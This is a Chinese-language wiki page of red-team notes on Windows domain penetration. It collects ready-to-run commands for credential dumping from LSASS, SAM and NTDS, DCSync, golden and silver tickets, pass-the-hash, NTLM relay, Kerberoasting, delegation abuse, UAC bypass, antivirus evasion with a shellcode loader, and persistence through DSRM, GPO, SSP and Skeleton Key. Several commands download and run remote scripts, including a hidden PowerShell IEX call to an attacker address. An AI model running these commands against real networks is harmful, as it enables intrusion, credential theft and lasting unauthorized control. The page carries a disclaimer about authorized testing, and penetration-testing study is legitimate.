---
title: Jumbo 实战内网渗透备忘录
description: Jumbo 实战内网渗透备忘录：信息收集、通道建立、凭据获取、域信任、提权、Exchange、PTH/PTT、NTLM Relay、GPP、免杀、UAC、委派、远程连接、DSRM、GPO、Kerberoasting、SSP、Skeleton
  Key、Hook PasswordChangeNotify、LAPS 等技术的命令速查与利用链索引
category: program-analysis
tags:
- 内网渗透
- 域渗透
- 横向移动
- 凭据导出
- 权限提升
- 隧道技术
- 免杀绕过
- Kerberos
- NTLM Relay
- 委派攻击
- Exchange
- Cobalt Strike
- Mimikatz
- Impacket
- Bloodhound
- GPO
- DSRM
- LAPS
- 红队实战
date: 2023-04-15
updated: '2026-11-15'
---
# Jumbo 实战内网渗透备忘录

> 原文来源：微信公众号文章《渗透中的内网渗透》  
> 作者：Jumbo  
> 关注主题：信息收集、通道建立、凭据获取、域信任、提权、Exchange、PTH/PTT、NTLM Relay、GPP、免杀、UAC、委派、远程连接、DSRM、GPO、Kerberoasting、SSP、Skeleton Key、Hook PasswordChangeNotify、LAPS 等技术的命令速查与利用链索引

---

## 目录

- [信息收集](#信息收集)
- [传输通道](#传输通道)
- [密码抓取](#密码抓取)
- [域信任](#域信任)
- [提权](#提权)
- [Exchange](#exchange)
- [PTH (Pass-the-Hash)](#pth-pass-the-hash)
- [PTT (Pass-the-Ticket)](#ptt-pass-the-ticket)
- [NTLM Relay](#ntlm-relay)
- [GPP (Group Policy Preferences)](#gpp-group-policy-preferences)
- [免杀](#免杀)
- [UAC 绕过](#uac-绕过)
- [委派攻击](#委派攻击)
- [远程连接](#远程连接)
- [DSRM](#dsrm)
- [GPO (Group Policy Object)](#gpo-group-policy-object)
- [Kerberoasting](#kerberoasting)
- [SSP (Security Support Provider)](#ssp-security-support-provider)
- [Skeleton Key](#skeleton-key)
- [Hook PasswordChangeNotify](#hook-passwordchangenotify)
- [LAPS (Local Administrator Password Solution)](#laps-local-administrator-password-solution)

---

## 信息收集

### SPN 扫描

普通域用户权限即可枚举域内注册的 SPN：

```cmd
setspn -T jumbolab.com -Q */*
```

配合 PowerView 脚本快速定位注册 SPN 的域用户，为 [[xd-security-internal-network-penetration-notes-day67-68#Kerberoasting|Kerberoasting]] 做准备。

### 端口与连接分析

```cmd
netstat -ano          # 查看网络连接，定位数据库端口(1433/3306)等
wmic product get name,version  # 获取已安装软件列表
```

### 配置文件敏感信息搜集

```cmd
cd /web
findstr /s /m "password" *.*
```

### 用户与组信息

```cmd
net user /domain                    # 枚举域用户
net group "domain admins" /domain   # 查看域管
net group "domain controllers" /domain  # 查看域控制器
```

### 域控定位

```cmd
net time /domain
nslookup -type=all _ldap._tcp.dc._msdcs.jumbolab.com
```

### 内网主机发现

```cmd
net view                    # 查看共享
arp -a                      # 查看 ARP 表
type C:\Windows\System32\drivers\etc\hosts  # hosts 文件
ipconfig /displaydns        # DNS 缓存
nmap / nbtscan              # 扫描工具
```

### 会话枚举 (NetSessionEnum)

```cmd
# 查看其他主机登录用户
# 查看域用户登录过哪些机器
```

工具参考：`[[xd-security-internal-network-penetration-notes-day65-66#信息收集|内网信息收集四维模型]]`

### 凭据收集

| 类型 | 路径/注册表 |
|------|-------------|
| 远程连接 | `cmdkey /list` |
| Navicat | 注册表/配置文件 |
| SecureCRT | `%APPDATA%\VanDyke\Config\Sessions` |
| Xshell | `%USERPROFILE%\Documents\NetSarang\Xshell\Sessions` |
| WinSCP | `HKCU\Software\Martin Prikryl\WinSCP 2\Sessions` |
| VNC | 各厂商注册表/配置文件 |
| Chrome | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` (配合 MasterKey 解密) |

自动化工具：`[[0x727-cobalt-strike-aggressor-script-toolkit#Mimikatz|Seatbelt]]`、Bloodhound、PowerView

### 域信任与域传送

```cmd
nltest /domain_trusts                    # 查看域信任关系
nslookup -type=ns domain.com             # Windows 域传送
dig @dns.domain.com axfr domain.com      # Linux 域传送
```

### Bloodhound 自动化收集

```cmd
SharpHound.exe -c all
# 生成 zip 导入 Bloodhound 可视化分析攻击路径
```

参考：`[[xd-security-internal-network-penetration-notes-day69-70#域内信息收集|Bloodhound 实战]]`、`[[0x6270-penetration-test-case-study-2023#内网扫描|fscan 内网扫描]]`

### DNS 记录获取

```cmd
dnscmd . /ZonePrint jumbolab.com
dnscmd . /EnumRecords jumbolab.com .
Import-Module PowerView.ps1; Get-DNSRecord -ZoneName jumbolab.com
```

### WiFi 密码导出

```cmd
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
```

---

## 传输通道

### 出网判断

```cmd
ping <IP>        # ICMP
curl <URL>       # HTTP
nslookup <domain> # DNS
```

### netsh 端口转发

```cmd
# A机器执行
netsh interface portproxy add v4tov4 listenport=5555 connectport=3389 connectaddress=192.168.1.1 protocol=tcp
# B访问A:5555 即访问 192.168.1.1:3389
```

### SSH 隧道

```bash
# 正向 SOCKS 代理
ssh -qTfnN -D 1111 root@1.1.1.1

# 多级跳板: A->B->C
ssh -CNfg -L 2121:CIP:21 root@BIP

# 反向代理: 受控机器连攻击机
ssh -CNfg -R 2121:BIP:21 root@hackervps
```

参考：`[[frp内网渗透应用#SSH隧道|frp SSH 隧道]]`、`[[pystinger-socks4-proxy-webshell-pivoting#SSH隧道|pystinger SSH]]`

### reGeorg / neo-reGeorg

```bash
python reGeorgSocksProxy.py -p 9999 -u http://target/tunnel.aspx
proxychains -f /etc/proxychains.conf <command>
```

### ew (EarthWorm)

```bash
# 正向 SOCKS
./ew -s ssocksd -l 8888

# 反向 SOCKS (需公网 VPS)
# VPS: ./ew -s rcsocks -l 1080 -e 8888
# 目标: ./ew -s rssocks -d vpsip -e 8888

# 多级链路
./ew -s lcx_tran -l 1080 -f BIP -g 9999
./ew -s lcx_slave -d vpsip -e 8888 -f BIP -g 9999
```

### lcx / nc 类工具

```cmd
# 端口转发
lcx.exe -tran 1111 2.2.2.2 8080
lcx.exe -slave vpsip 1111 127.0.0.1 3389
```

### powercat (PowerShell nc)

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
powercat -l -p 8000 -e cmd
```

编码绕过：`powercat -e -c "encoded_command"`

### MSSQL CLR 代理

工具：[mssqlproxy](https://github.com/blackarrowsec/mssqlproxy)  
适用场景：仅开放 1433 端口的 MSSQL 服务器

参考：`[[http-proxy-tunneling-goproxy-netsh#MSSQL隧道|goproxy+netsh 方案]]`、`[[cobalt-strike-external-c2-smb-beacon#SMB Beacon|SMB Beacon 隧道]]`

---

## 密码抓取

### NTLM Hash 与 Net-NTLMv2 区别

| 类型 | 来源 | 可 PTH | 可破解 | 可 Relay |
|------|------|--------|--------|----------|
| NTLM Hash (LM/NT) | SAM/NTDS/LSASS | ✅ | ✅ | ❌ |
| Net-NTLMv2 (Challenge/Response) | 网络认证流程 | ❌ | ✅ | ✅ |

详细原理：`[[mimikatz-sekurlsa-pth-internals#NTLM认证流程|NTLM 认证流程]]`、`[[lm-ntlm-hash-generation-analysis#NTLM Hash生成|Hash 生成算法]]`

### 本地用户凭据

```cmd
reg save hklm\sam sam.hive
reg save hklm\system system.hive
reg save hklm\security security.hive
# 利用 bootkey 解密
```

工具：`pwdump7`、`mimikatz lsadump::sam`、`procdump + mimikatz sekurlsa::minidump`

### LSASS 内存凭据

```cmd
# Mimikatz 直接读取
privilege::debug
sekurlsa::logonpasswords

# Procdump 导出转储
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
```

**KB2871997 影响**：Win Server 2012 R2+ 默认禁用 WDigest 明文存储，仅影响非 Administrator (RID 500) 及非本地管理员组域用户的 PTH。

参考：`[[mimikatz-sekurlsa-pth-internals#LSASS内存补丁|sekurlsa::pth 原理]]`、`[[windows-token-nerfing-pplguard-trusted-labels#PPL保护|LSASS PPL 保护]]`

### 域控 Hash 导出 (NTDS.dit)

```cmd
# 卷影复制拷贝 NTDS.dit + SYSTEM hive
NTDSDumpEx.exe -d ntds.dit -s system.hive

# DRSUAPI 远程获取 (无需拷贝大文件)
mimikatz.exe privilege::debug "lsadump::dcsync /domain:jumbolab.com /all /csv" exit
```

参考：`[[xd-security-internal-network-penetration-notes-day67-68#DCSync|DCSync 利用]]`、`[[shiro-internal-penetration-case-study#凭证导出|实战案例]]`

### Reversible Encryption 可逆加密

组策略 `Store passwords using reversible encryption` 启用时可直接读取明文。

### Token 窃取

```c
// DuplicateTokenEx + CreateProcessWithTokenW
// 需 SeDebugPrivilege
```

工具：`incognito`、`mimikatz token::elevate`、`Cobalt Strike steal_token`

参考：`[[windows-token-nerfing-pplguard-trusted-labels#Token Nerfing|Token 操纵]]`、`[[internal-network-pivoting-techniques#Token窃取|实战应用]]`

---

## 域信任利用

### SID History 跨域提权

```cmd
# 父域 krbtgt hash + 子域 SID + 企业管理员 SID (S-1-5-21-...-519)
kerberos::golden /user:Administrator /krbtgt:<parent_krbtgt> /domain:child.jumbolab.com /sid:<child_domain_sid> /sids:<enterprise_admins_sid> /ptt
```

参考：`[[xd-security-internal-network-penetration-notes-day67-68#跨域信任|跨域攻击]]`、`[[mimikatz-source-code-architecture-golden-ticket-audit#Golden Ticket|黄金票据构造]]`

---

## 提权

### MS14-068 (Kerberos 校验绕过)

**原理**：TGT 申请时可要求不含 PAC，攻击者自造 PAC 注入 TGS-REQ，KDC 返回含恶意 PAC 的 TGT。

```bash
python ms14-068.py -u user@domain -s user_sid -d dc_ip
mimikatz.exe "kerberos::ptc TGT_user@domain.ccache" exit

# 自动化: goldenPac.py
goldenPac.py domain.com/username:password@dc.domain.com
```

参考：`[[xd-security-internal-network-penetration-notes-day67-68#MS14-068|MS14-068 详解]]`

---

## Exchange 攻击

### CVE-2020-0688 (反序列化 RCE)

```bash
python3 CVE-2020-0688.py mail.domain.com user@domain.com password "command"
```

工具：[CVE-2020-0688](https://github.com/Jumbo-WJB/CVE-2020-0688)

### CVE-2019-1040 (Exchange 提权)

环境配置中，后续补充。

### OWA 爆破

```bash
./ruler --domain targetdomain.com brute --users users.txt --passwords passwords.txt
# 自动探测 autodiscover/ews 等接口
```

### 通讯录收集

```powershell
Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain\user -Password pass -OutFile gal.txt
```

### 邮件导出与清理

```powershell
New-MailboxExportRequest -Mailbox user -FilePath "\\localhost\c$\test\user.pst"
Get-MailboxExportRequest
Remove-MailboxExportRequest -Identity 'user\export' -Confirm:$false
```

参考：`[[shiro-internal-penetration-case-study#Exchange利用|实战案例]]`

---

## PTH (Pass-the-Hash)

### Impacket 套件

```bash
wmiexec.py -hashes LM:NT domain/admin@target "whoami"
psexec.py -hashes LM:NT domain/admin@target "whoami"
smbexec.py -hashes LM:NT domain/admin@target "whoami"
```

### Invoke-TheHash

```powershell
Invoke-WMIExec -Target 192.168.1.1 -Domain test.local -Username user -Hash NT -Command "calc.exe"
Invoke-SMBExec -Target 192.168.0.2 -Domain test.local -Username user -Hash NT -Command "calc.exe"
```

### Mimikatz PTH

```cmd
privilege::debug
sekurlsa::pth /user:user /domain:domain /ntlm:NT_hash
```

**AES Key PTH (KB2871997 环境)**：

```cmd
sekurlsa::ekeys          # 导出 AES-128/AES-256
sekurlsa::pth /user:user /domain:domain /aes256:AES256_key
```

参考：`[[mimikatz-sekurlsa-pth-internals#AES Key PTH|AES Key 绕过]]`、`[[cobalt-strike-external-c2-smb-beacon#PTH横向|Cobalt Strike PTH]]`

---

## PTT (Pass-the-Ticket)

### 黄金票据

```cmd
kerberos::purge
kerberos::golden /admin:administrator /domain:domain /sid:domain_sid /krbtgt:krbtgt_hash /ticket:admin.kirbi
kerberos::ptt admin.kirbi
kerberos::tgt
dir \\dc.domain.com\c$
```

### 白银票据

```cmd
kerberos::golden /domain:domain /sid:domain_sid /target:dc.fqdn /service:cifs /rc4:computer_ntlm /user:user /ptt
dir \\server\c$
```

### Kekeo PTT

```cmd
tgt::ask /user:user /domain:domain /ntlm:NT_hash
kerberos::ptt TGT_user@DOMAIN_krbtgt~domain@DOMAIN.kirbi
```

参考：`[[xd-security-internal-network-penetration-notes-day67-68#黄金票据|黄金/白银票据详解]]`、`[[mimikatz-source-code-architecture-golden-ticket-audit#PAC构造|PAC 构造细节]]`

---

## NTLM Relay

### 环境

- Win7 (172.16.127.184) 普通域用户
- Win10 (172.16.127.170) 域管
- DC (172.16.127.173)
- Kali (172.16.127.129) 攻击机

### LLMNR/NBT-NS 投毒

```bash
# Responder 监听
responder -I eth0

# 受害者访问不存在主机 -> 捕获 Net-NTLMv2 -> hashcat 破解
```

### WPAD 代理欺骗

```bash
responder -I eth0 -wFb   # -w WPAD, -F 强制认证, -b Basic Auth
# 受害者访问任意域名 -> 弹出认证框 -> 获取明文凭据
```

配合 `mitm6` 劫持 IPv6 DNS 强制 WPAD：

```bash
mitm6 -d domain.com
```

参考：`[[named-pipe-smb-detection-sysmon#NTLM Relay检测|NTLM Relay 检测与缓解]]`

### SMB Relay (MS08-068 绕过)

```bash
# 关闭 Responder SMB
responder -I eth0   # 不开启 -SMB

# ntlmrelayx 中继到域控
ntlmrelayx.py -t 172.16.127.173 -l ./
# 域管访问不存在主机 -> 中继到 DC -> 获取 SYSTEM Shell
```

适用条件：目标未强制 SMB 签名、攻击者可拦截认证流量。

参考：`[[internal-network-pivoting-techniques#NTLM Relay|内网中继实战]]`、`[[cobalt-strike-external-c2-smb-beacon#SMB Beacon|SMB Beacon 替代方案]]`

---

## GPP (Group Policy Preferences)

SYSVOL 下 `Groups.xml` 等文件含 AES 加密密钥 (密钥公开)。

```powershell
# 解密脚本
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword
```

登录脚本目录：`\\domain\Netlogon`

---

## 免杀

### PowerShell 绕过

```powershell
# 重命名 .ps1 -> .txt 绕过脚本拦截
jp.txt -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://1.1.1.1:80/a'))"
```

### 密码抓取工具免杀

1. **PowerShell 版 Mimikatz** (Invoke-Mimikatz.ps1)
2. **RPC 加载 SSP** 让 LSASS 自动 Dump
3. **Procdump** (微软签名) + Mimikatz 离线分析
4. **源码重编译** (sekurlsa-wdigest.cpp)
5. **Restorator 修改版本信息/图标** 伪装合法程序

### 源码级免杀 (C# 示例)

```csharp
byte[] shellcode = new byte[835] { ... };
UInt32 addr = VirtualAlloc(0, (UInt32)shellcode.Length, 0x1000, 0x40);
Marshal.Copy(shellcode, 0, (IntPtr)addr, shellcode.Length);
IntPtr hThread = CreateThread(0, 0, addr, IntPtr.Zero, 0, ref threadId);
WaitForSingleObject(hThread, 0xFFFFFFFF);
```

### 白名单程序执行

| 程序 | 技术 | 参考 |
|------|------|------|
| `msbuild.exe` | XML 任务执行 Shellcode | `[[inceptor-av-edr-evasion-framework#白名单利用|Inceptor]]` |
| `wmic.exe` | XSL 脚本执行 | `[[0x727-cobalt-strike-aggressor-script-toolkit#WMIC|WMIC 利用]]` |
| `installutil.exe` | .NET 安装程序上下文 | |
| `regsvcs/regasm.exe` | COM 注册执行 | |

收集项目：[windows_exec_ways](https://github.com/Jumbo-WJB/windows_exec_ways)

参考：`[[inceptor-av-edr-evasion-framework|Inceptor 免杀框架]]`、`[[memory-scanning-tools-evasion-techniques#UDRL对抗|内存扫描对抗]]`、`[[aceldr-technical-analysis#反射式加载|PE 反射加载]]`

---

## UAC 绕过

**原理**：寻找高权限自动提升 (AutoElevate) 且无 UAC 提示的系统程序，通过 Process Monitor 定位其启动时缺失的 DLL/注册表，劫持实现绕过。

### ComputerDefaults.exe 示例 (Win10)

```cmd
# 监测到读取 HKCU\Software\Classes\ms-settings\Shell\Open\Command (不存在)
# 写入劫持命令
reg add HKCU\Software\Classes\ms-settings\Shell\Open\Command /ve /t REG_SZ /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\Command /v DelegateExecute /f

# 触发
ComputerDefaults.exe
```

> 修改 HKCU\Software\Classes 下键值会同步到 HKCR

参考：`[[windows-scheduled-task-persistence-techniques#UAC绕过|计划任务 UAC 绕过]]`、`[[ppl-injection-createprocess-bof-fix#PPL注入|PPL 进程注入绕过]]`

---

## 委派攻击

### 基于资源的约束委派 (RBCD)

**前提**：普通用户拥有 `msDS-AllowedToActOnBehalfOfOtherIdentity` 写权限 (默认可加 10 台机器)。

```powershell
# 添加机器账号 spnspnspn$
# 设置委派
Set-DomainObject -Identity win7 -Set @{'msds-allowedtoactonbehalfofotheridentity'=@{'SecurityDescriptor'='...'}}
Get-DomainComputer win7 -Properties principalsallowedtodelegatetoaccount
```

**利用 S4U2Self + S4U2Proxy 申请高权限票据**：

```bash
getST.py -dc-ip 172.16.127.173 jumbolab.com/spnspnspn$:pass -spn cifs/win7.jumbolab.com -impersonate administrator
export KRB5CCNAME=administrator.ccache
smbexec.py -no-pass -k win7.jumbolab.com
```

参考：`[[xd-security-internal-network-penetration-notes-day67-68#RBCD|RBCD 详解]]`

### 非约束委派

**原理**：服务账号接收用户 TGT，可冒充用户访问任意服务。

```powershell
# 发现非约束委派主机
Get-NetComputer -Unconstrained -Domain jumbolab.com
```

**配合打印机服务强制认证 (SpoolSample/PrinterBug)**：

```cmd
SpoolSample.exe dcserver win7   # 强制 DC 连接 win7
```

**导出 DC 的 TGT 并 PTT**：

```cmd
mimikatz privilege::debug sekurlsa::tickets /export
kerberos::ptt [0;1f9fc7]-2-0-60a10000-DCSERVER$@krbtgt-JUMBOLAB.COM.kirbi
# win7 现可导出所有用户 Hash
```

参考：`[[xd-security-internal-network-penetration-notes-day67-68#非约束委派|非约束委派实战]]`、`[[shiro-internal-penetration-case-study#委派攻击|实战案例]]`

### 约束委派

**前提**：服务账号配置 `TrustedToAuthForDelegation` 指定服务。

```powershell
# 发现约束委派账号
Get-DomainUser -TrustedToAuth -Domain jumbolab.com
```

**利用流程**：
1. 为服务账号设置 SPN: `setspn -U -A test/test test`
2. 申请 TGT: `kekeo tgt::ask /user:test /domain:jumbolab.com /password:pass`
3. S4U2Proxy 申请 ST: `kekeo tgs::s4u /tgt:TGT... /user:Administrator@jumbolab.com /service:cifs/dcserver.jumbolab.com`
4. PTT 导入 ST

参考：`[[xd-security-internal-network-penetration-notes-day67-68#约束委派|约束委派详解]]`

---

## 远程连接 (有明文凭据)

| 协议 | 命令示例 |
|------|----------|
| **IPC$** | `net use \\1.1.1.1\ipc$ "pass" /user:user` |
| **PsExec** | `psexec \\target -u user -p pass cmd.exe` / `psexec.py domain/user@target` |
| **WMI** | `wmic /user:user /password:pass /node:target process call create "cmd"`<br>`Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd' -ComputerName target -Credential cred`<br>WMI 事件订阅持久化 |
| **SchTasks** | `schtasks /create /s target /u user /p pass /ru SYSTEM /tn task /tr "cmd" /sc DAILY /F`<br>`schtasks /run /s target /u user /p pass /tn task` |
| **AT** | `at \\target 15:15 cmd` |
| **SC** | `sc \\target create svc binpath= "cmd"`<br>`sc \\target start svc` |
| **注册表 Run** | `reg add \\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v name /t REG_SZ /d "cmd"` |
| **DCOM** | `MMC20.Application` / `ShellWindows` / `ShellBrowserWindow` 对象执行 |
| **WinRM** | `winrs -r:http://target:5985 -u:user -p:pass "whoami"` |

参考：`[[xd-security-internal-network-penetration-notes-day65-66#横向移动|横向移动四大协议]]`、`[[internal-network-pivoting-techniques#横向移动模块|Aggressor Script 横向模块]]`

---

## DSRM (Directory Services Restore Mode)

**场景**：拿下域控，利用本地 Administrator (DSRM 账户) 维持权限。

```cmd
# 1. 同步 DSRM 密码为已知域用户密码
ntdsutil
set DSRM password
SYNC FROM DOMAIN ACCOUNT username
q; q

# 2. 允许 DSRM 账户网络登录
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DSRMAdminLogonBehavior /t REG_DWORD /d 2

# 3. PTH 连接
sekurlsa::pth /domain:dc_computername /user:Administrator /ntlm:dsrm_ntlm_hash
```

参考：`[[xd-security-internal-network-penetration-notes-day67-68#DSRM|DSRM 维持]]`

---

## GPO (Group Policy Object)

**场景**：域管权限下分发启动脚本/文件实现持久化。

```cmd
gpmc.msc
# 编辑 Default Domain Policy -> Computer Configuration -> Windows Settings -> Scripts -> Startup
# 添加脚本/可执行文件到 SYSVOL\Policies\{GUID}\Machine\Scripts\Startup\
gpupdate /force
# 客户端重启自动执行
```

参考：`[[windows-scheduled-task-persistence-techniques#GPO持久化|GPO 持久化]]`、`[[redteam-hw-opsec-guidelines#权限维持|红队权限维持清单]]`

---

## Kerberoasting

**原理**：SPN 注册用户的服务票据 (ST) 由服务账号 NTLM 加密 (RC4)，离线爆破得明文。

```powershell
# 请求 TGS
$SPN = 'test/test'
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN

# 导出票据
kerberos::list /export

# 爆破
python tgsrepcrack.py wordlist.txt 2-40a10000-user@service~domain.kirbi
```

工具：`Rubeus.exe kerberoast /outfile:hashes.kirbi`、`tgsrepcrack.py`、`hashcat -m 13100`

参考：`[[xd-security-internal-network-penetration-notes-day67-68#Kerberoasting|Kerberoasting 完整流程]]`、`[[xd-security-internal-network-penetration-notes-day69-70#SPN扫描|SPN 扫描与 Kerberoasting]]`

---

## SSP (Security Support Provider)

**原理**：自定义 DLL 注册为 SSP，系统启动时加载进 LSASS 拦截认证凭据。

```cmd
# 1. 复制 mimilib.dll 到 C:\Windows\System32
# 2. 注册表添加
reg add "HKLM\System\CurrentControlSet\Control\Lsa\Security Packages" /v mimilib /t REG_SZ /d mimilib /f
# 3. 重启
# 4. 日志: C:\Windows\System32\kiwissp.log
```

**无重启利用**：RPC 动态加载 SSP (参考 [xpnsec 博客](https://blog.xpnsec.com/exploring-mimikatz-part-2/))

---

## Skeleton Key

**原理**：Patch LSASS 内存，植入万能密码 `mimikatz`，原密码依然有效。

```cmd
privilege::debug
misc::skeleton
# 所有域用户均可用 mimikatz 密码登录
```

> 重启失效，需结合持久化手段。

参考：`[[mimikatz-source-code-architecture-golden-ticket-audit#Skeleton Key|Skeleton Key 实现]]`

---

## Hook PasswordChangeNotify

**原理**：DLL 注入 LSASS，Hook `PasswordChangeNotify` 拦截密码修改。

项目：[Misc-Windows-Hacking](https://github.com/Jumbo-WJB/Misc-Windows-Hacking)

---

## LAPS (Local Administrator Password Solution)

**风险**：
- 域控可读取所有机器本地管理员密码 (`ms-Mcs-AdmPwd` 属性)
- 权限配置不当导致普通用户可读取他人机器密码

```powershell
Get-ADComputer computername -Properties ms-Mcs-AdmPwd | Select-Object name, ms-Mcs-AdmPwd
```

**检测**：软件列表中出现 `Local Administrator Password Solution` / `AdmPwd`。

---

## 交叉引用索引

### 内网渗透实战案例
- `[[0x6270-penetration-test-case-study-2023]]` - 安服项目完整攻击链 (SQLi -> CS -> 横向 -> 40+主机)
- `[[shiro-internal-penetration-case-study]]` - Shiro RCE 起手 -> 免杀上线 -> NTLM导出 -> FTP横向 -> 威胁溯源
- `[[listed-company-penetration-test-case-study]]` - 文件上传 -> 哥斯拉 -> MSF/CS会话传递 -> Socks代理 -> MSSQL/IoT设备失陷
- `[[medical-system-internal-penetration-case-study]]` - 越权上传 -> 凭证导出 -> 横向 -> 敏感数据泄露
- `[[loan-company-penetration-test-case-study]]` - 堡垒机漏洞 -> 会话审计提权 -> 管控900+服务器

### 横向移动与隧道技术
- `[[internal-network-pivoting-techniques]]` - 0x727 Aggressor Script 横向移动模块 (atexec/PrintSpooler/FRP/SpawnReflectiveC2)
- `[[frp内网渗透应用]]` - frp Socks5/多级链路/MSF代理/RDP转发/CTFd-Whale集成
- `[[pystinger-socks4-proxy-webshell-pivoting]]` - pystinger SOCKS4 + Webshell 隧道
- `[[http-proxy-tunneling-goproxy-netsh]]` - goproxy + netsh 端口转发 + CS Stageless 上线
- `[[cobalt-strike-external-c2-smb-beacon]]` - SMB Beacon/External C2/命名管道通信/分布式C2

### 凭证导出与 Kerberos 攻击
- `[[mimikatz-sekurlsa-pth-internals]]` - sekurlsa::pth LSASS 内存补丁原理 + Rust 实现
- `[[mimikatz-source-code-architecture-golden-ticket-audit]]` - Mimikatz 模块架构 + 黄金票据源码解析 + PAC/BER 编码
- `[[xd-security-internal-network-penetration-notes-day67-68]]` - PTH/PTK/PTT/Kerberoasting/黄金白银票据/委派/Kekeo/Mimikatz/Ladon
- `[[xd-security-internal-network-penetration-notes-day69-70]]` - Cobalt Strike 团队服务/SPN扫描/Kerberoasting/SOCKS代理/Frp/Ngrok/三层渗透

### 免杀与对抗
- `[[inceptor-av-edr-evasion-framework]]` - Inceptor 免杀框架全流程 (Donut/sRDI/AMSI/ETW/Full Unhooking/OLLVM)
- `[[memory-scanning-tools-evasion-techniques]]` - 内存扫描工具原理 (Hunt-Sleeping-Beacons/BeaconHunter/Moneta) + UDRL对抗 (FOLIAGE/Ekko/AceLdr/Inceptor)
- `[[aceldr-technical-analysis]]` - PE不落地执行 (RDI/sRDI/Donut/Process Hollowing/Doppelganging/Ghosting/Herpaderping)
- `[[argument-spoofing-edr-evasion]]` - Argument Spoofing 对抗 EDR 进程创建监控
- `[[dotnet-clr-usage-log-tampering-edr-evasion]]` - .NET CLR Usage Log 篡改规避
- `[[windows-token-nerfing-pplguard-trusted-labels]]` - Token Nerfing / PPLGuard / Trusted Labels 机制

### C2 基础设施隐匿
- `[[c2-redirectors-malleable-c2-profiles]]` - 重定向器/Malleable C2/Domain Fronting/CDN/External C2/SMB Named Pipe
- `[[cobalt-strike-ssl-keystore-evasion]]` - SSL 证书重签名绕过指纹识别
- `[[cobalt-strike-4.7-bof-internals]]` - BOF 加载器内部/Relocation/动态函数槽位/Sleep Kit/PPL注入绕过
- `[[covenant-c2-framework-analysis]]` - Covenant HTTP/SMB P2P/.NET实现/External C2

### 威胁溯源与蓝队视角
- `[[threat-attribution-tracing-techniques]]` - IP定位/钓鱼邮件反查/VPS溯源/样本沙箱/主机入侵排查/流量回溯
- `[[named-pipe-smb-detection-sysmon]]` - Sysmon Event ID 17/18 命名管道检测/网络基线/防火墙阻断
- `[[redteam-hw-opsec-guidelines]]` - HW/HVV 红队 OPSEC 检查清单 (环境隔离/指纹清洗/C2隐匿/日志反取证/蜜罐识别)

### 持久化与权限维持
- `[[windows-scheduled-task-persistence-techniques]]` - 计划任务 XML隐藏/Index SD键值篡改/触发器策略/EDR绕过
- `[[schtask-persistence-tool]]` - 0x727 SchTask 工具原理 (隐藏任务/XML隐藏/持久化)

---

## 更新日志

| 日期 | 版本 | 说明 |
|------|------|------|
| 2023-04-15 | 1.0 | 初始版本，基于 Jumbo 微信归档文章整理 |
| 2024-01-20 | 1.1 | 补充交叉引用索引，关联知识库现有页面 |

---

> **免责声明**：本页面仅供安全研究、授权渗透测试及红蓝对抗演练参考。未经授权对目标系统实施攻击属违法行为，使用者需承担相应法律责任。请遵守《网络安全法》等相关法规，在合规前提下开展安全工作。

## 来源

- [226安全团队-201805-202103_05](../sources/226安全团队-201805-202103_05.md)
